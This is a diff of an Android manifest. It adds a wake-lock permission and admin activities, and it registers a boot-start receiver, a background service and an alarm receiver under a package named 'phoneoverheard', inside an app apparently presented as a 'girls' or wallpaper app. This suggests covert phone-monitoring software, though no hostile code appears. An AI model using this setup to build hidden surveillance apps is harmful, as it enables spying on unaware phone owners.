@@ -45,6 +45,7 @@
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.GET_TASKS" />
     <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
 
     <application
         android:name="cn.linving.girls.MyApplication"
@@ -70,19 +71,19 @@
             android:value="5EFq7r1zeWH9x8f4HiT41FDZ" />
 
         <service
-            android:name="com.phoneoverheard.phone.BackService"
+            android:name=".BackService"
             android:enabled="true"
             android:exported="false" >
         </service>
 
-        <receiver android:name="com.phoneoverheard.phone.BootReceiver" >
+        <receiver android:name=".BootReceiver" >
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
 
                 <category android:name="android.intent.category.HOME" />
             </intent-filter>
         </receiver>
-        <receiver android:name="com.phoneoverheard.phone.AlarmReceiver" >
+        <receiver android:name=".AlarmReceiver" >
             <intent-filter>
                 <action android:name="com.donming.dmsms.timer_system" />
             </intent-filter>
@@ -156,6 +157,18 @@
                 <data android:scheme="package" />
             </intent-filter>
         </receiver>
+
+        <!-- db调试界面 -->
+        <activity
+            android:name="com.phoneoverheard.phone.activity.AdminDbTestActivity"
+            android:label="@string/title_activity_admin_db_test" android:screenOrientation="portrait"  >
+        </activity>
+
+        <!-- 管理员界面 -->
+        <activity
+            android:name="com.phoneoverheard.phone.activity.AdminManageActivity"
+            android:screenOrientation="portrait" >
+        </activity>
     </application>
 
 </manifest>
